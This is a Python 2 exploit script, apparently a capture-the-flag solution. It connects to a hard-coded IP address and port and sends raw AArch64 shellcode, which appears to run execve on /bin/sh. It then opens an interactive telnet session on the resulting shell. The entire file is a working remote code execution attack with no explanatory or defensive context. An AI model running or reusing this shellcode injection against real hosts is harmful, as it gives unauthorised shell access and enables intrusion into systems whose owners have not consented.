import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '210.71.253.109'
port = 9123

sc = "\xa8\x1b\x80\xd2\x01\x00\x80\xd2\x02\x00\x80\xd2\x03\x0d\x80\xd2\x63\xdc\x78\xd3\x63\xcc\x01\x91\x63\xdc\x78\xd3\x63\xbc\x00\x91\x63\xdc\x78\xd3\x63\xb8\x01\x91\x63\xdc\x78\xd3\x63\xa4\x01\x91\x63\xdc\x78\xd3\x63\x88\x01\x91\x63\xdc\x78\xd3\x63\xbc\x00\x91\xe3\x03\x00\xf9\xe0\x03\x00\x91\x01\x00\x00\xd4"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

f.write("00000076" + sc + "\x00" * 76)

t = telnetlib.Telnet()
t.sock = s
t.interact()
